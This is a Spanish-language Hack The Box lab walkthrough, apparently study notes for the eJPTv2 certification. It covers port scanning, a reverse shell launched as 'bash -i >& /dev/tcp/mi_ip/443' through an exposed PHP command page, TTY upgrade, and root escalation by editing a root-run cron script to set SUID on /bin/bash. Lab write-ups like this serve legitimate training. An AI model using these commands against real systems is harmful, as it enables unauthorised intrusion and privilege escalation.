***

Máquina Hack The Box

## Reconocimiento activo:

Realizamos un nmap a la ip de la máquina -> 10.129.23.138

```bash
nmap -p- TCP --open -sS --min-rate 5000 -vvv -n -Pn 10.129.23.138 -oG allPorts
```
Podemos observar que el puerto 80 está abierto

```bash
nmap -p80 -sCV -oN targeted Nmap
```
## Enumeración:

Seguimos con la enumeración, la cual también es posible hacerla desde nmap

```SQL
nmap --script http-enum -p80 10.129.23.138 -oN webScan

-oN: formato nmap
```

#### Reverse Shell

Dentro de la páginas podemos ver que hay un archivo .php expuesto el cual nos permite ejecutar comandos, por lo que nos lo enviamos a nuestra máquina mediante una reverse shell con el siguiente comandos:

```bash
# 1. Nos ponemos en escucha con netcat por el puerto 443
nc -nlvp 443

# 2. Lanzamos una revershell
bash -c "bash -i >%26 /dev/tcp/mi_ip/443 0>%261"

# El ampersand está urlencodeado %26 = &
```

#### Tratamiento de TTY

Al tener una consola por el puerto 443, esta será básica (ej. si hago un Ctrl C se muera el acceso). Para evitar esto realizamos un tratamiento de TTY de la siguiente forma:

```bash

# 1. Engendramos una pseudoterminal dentro de la máquina víctima. Ejecuta bash registrando la sesión en /dev/null para no dejar logs, permitiendo que el sistema reconozca que hay una terminal real detrás.

script /dev/null -c bash

# 2. Lo ponemos en segundo plano
Presionamos ctrl + z

# 3. Modificamos la terminal local y reanudamos la remota
# raw: Pasa las pulsaciones de teclas sin procesar directamente a la shell remota (permite usar Ctrl+C).
# -echo: Desactivar la repetición visual de comandos locales
# fg: Trae la shell remota de vuelta a primer plano
stty raw -echo; fg

# 4. Reiniciamos el estado del emulador de terminal tras volver al primer plano
reset xterm

# 5. Fijar las variables de entorno
export TERM=xterm

# 6. Establecer dimensiones exactas
stty rows 44 columns 184

```

Ya estando dentro del sistema, buscamos archivos con privilegios SUID

```bash
find / -perm -4000 -user root 2>/dev/null # Buscar desde la raíz archivo permiso SUID, cuyo propietario sea root
```

Si no vemos nada interesante, optamos por la opción de ver capabilities del sistema.

```bash
getcap -r / 2>/dev/null # Para ver capabilities con binarios explotables
```

Ya que no hay ningún binario explotable, miramos que archivos nos pertenece

```bash
find / -user scriptmanager 2>/dev/null | grep -v "proc"
```

Encontramos una carpeta con dos archivos dentro: test.txt | test.py, miramos el contenido del script

![[eJPTv2/imgs/contenido_test.py bashed.png]]

Nos fijamos quien es el que escribe dicho contenido en el .txt

![[eJPTv2/imgs/ls-scripts.png]]

Al parecer es una tarea programada (crontab), por lo usamos el siguiente comandos para listar los procesos y filtramos por test.py

```bash
ps aux | grep "script.py"
```

Y efectivamente confirmamos que se trata de un contrab, ahora queremos ver la diferencia de qué procesos se ejecutaron y se ejecutan (old vs new), por lo que nos creamos un archivo llamado procmon.sh para ver dicha diferencia.

![[eJPTv2/imgs/procmon.png]]

Damos permisos de ejecución y vamos viendo qué procesos se ejecutaron:

![[eJPTv2/imgs/procesos_bashed.png]]

Como podemos ver, root se mete dentro de la carpeta scripts y ejecuta los archivos .py, por lo que podemos asignarle permisos SUID al archivo python.

Ya que root ejecuta el .py, cambiamos el contenido del archivo

![[eJPTv2/imgs/suid.png]]

Guardamos y monitorizamos con el siguiente comando para ver si los permisos cambian

```bash
watch -n1 ls -l /bin/bash
```

Ahora que tenemos permisos SUID, lanzamos una bash con privilegios

```bash
bash -p 
```

Y con `whoami` podemos ver qué usuario somos, el cual es root.

**OJO: EL PROCESO SIEMPRE ES EL MISMO CUANDO OBTIENES UNA RS A TRAVÉS DE NETCAT**